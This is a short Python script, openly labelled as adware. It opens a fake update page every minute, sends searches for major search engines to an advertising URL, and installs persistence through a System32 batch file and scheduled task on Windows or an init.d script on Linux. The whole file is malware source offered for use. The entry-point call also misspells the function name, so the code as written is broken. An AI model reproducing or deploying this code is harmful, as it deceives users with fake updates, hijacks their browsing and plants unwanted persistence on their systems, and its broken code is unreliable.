import os
import platform
import webbrowser
import threading
import time

def adware_fake_update_prompts_redirect_ads(update_url: str, ad_url: str) -> None:
    def display_fake_update():
        while True:
            webbrowser.open(update_url)
            time.sleep(60)  # Display update prompt every 60 seconds

    def redirect_website(url):
        if "google.com" in url or "bing.com" in url or "duckduckgo.com" in url:
            webbrowser.open(ad_url)

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            with open("C:\\Windows\\System32\\AdwareService.bat", "w") as f:
                f.write(f'start {__file__}')
            os.system('schtasks /create /tn AdwareService /tr "C:\\Windows\\System32\\AdwareService.bat" /sc minute /mo 1')
        elif system == "Linux":
            with open("/etc/init.d/adware", "w") as f:
                f.write(f'#!/bin/bash\npython3 {__file__} &')
            os.system('chmod +x /etc/init.d/adware')
            os.system('update-rc.d adware defaults')

    threading.Thread(target=display_fake_update).start()
    create_persistence()

    while True:
        url = input("Enter the URL you want to visit: ")
        redirect_website(url)

if __name__ == "__main__":
    adware_fake_update_promots_redirect_ads("http://example.com/update", "http://example.com/ad")
